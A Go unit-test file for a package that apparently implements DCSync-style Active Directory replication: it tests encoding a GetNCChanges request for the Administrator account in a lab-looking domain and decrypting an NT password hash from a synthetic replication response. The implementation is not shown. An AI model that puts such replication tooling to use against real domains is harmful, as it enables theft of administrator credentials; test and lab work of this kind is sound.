package drs

import (
	"strings"
	"testing"
)

func TestEncodeGetNCChangesContainsDN(t *testing.T) {
	dn := "CN=Administrator,CN=Users,DC=danglingtree,DC=htb"
	b := encodeGetNCChanges(3, dn)
	if len(b) < 24 {
		t.Fatal("short")
	}
	if !utf16Has(b, "Administrator") {
		t.Fatal("missing DN")
	}
	if b[22] != drsOpGetChg {
		t.Fatalf("opnum %d", b[22])
	}
}

func TestExtractNTHashFromEncryptedBlob(t *testing.T) {
	key := bytesRepeat(0x22, 16)
	nt := []byte{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}
	enc, err := EncryptAttributeValue(key, nt)
	if err != nil {
		t.Fatal(err)
	}
	resp := make([]byte, 24+len(enc))
	resp[2] = 2
	copy(resp[24:], enc)
	got, err := extractNTHash(key, resp)
	if err != nil {
		t.Fatal(err)
	}
	if got != "0102030405060708090a0b0c0d0e0f10" {
		t.Fatalf("%s", got)
	}
}

func utf16Has(b []byte, s string) bool {
	for i := 0; i+1 < len(b); i++ {
		ok := true
		for j, r := range s {
			off := i + j*2
			if off+1 >= len(b) || b[off] != byte(r) || b[off+1] != 0 {
				ok = false
				break
			}
		}
		if ok {
			return true
		}
	}
	return false
}

func bytesRepeat(v byte, n int) []byte {
	b := make([]byte, n)
	for i := range b {
		b[i] = v
	}
	return b
}

func TestReplicateObjectNilSession(t *testing.T) {
	_, err := ReplicateObject(nil, "CN=A")
	if err == nil {
		t.Fatal("nil")
	}
	if !strings.Contains(err.Error(), "session") {
		t.Fatal(err)
	}
}
